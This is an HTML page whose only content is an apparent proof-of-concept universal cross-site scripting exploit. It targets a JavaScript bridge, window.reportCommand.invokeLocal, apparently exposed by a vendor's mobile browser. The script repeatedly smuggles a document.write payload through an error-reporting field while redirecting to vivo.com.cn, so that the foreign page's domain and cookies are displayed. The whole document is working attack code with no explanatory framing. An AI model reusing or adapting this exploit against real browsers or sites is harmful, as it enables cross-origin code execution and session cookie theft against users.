<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<script>

(function() {
    var TARGET = "https://www.vivo.com.cn/";
    var NAV_DELAY_MS = 200;

    var payload = "document.write('UXSS:'+document.domain+' cookie='+document.cookie);//";

    function inject() {
        try {
            var data = JSON.stringify({ webErrorCatch: payload });
            window.reportCommand.invokeLocal("xyzNotExist", data);
        } catch(e) {}
    }

    for (var i = 0; i < 200; i++) {
        setTimeout(inject, NAV_DELAY_MS + i * 10);
    }

    setTimeout(function() {
        location.href = TARGET;
    }, NAV_DELAY_MS);
})();
</script>
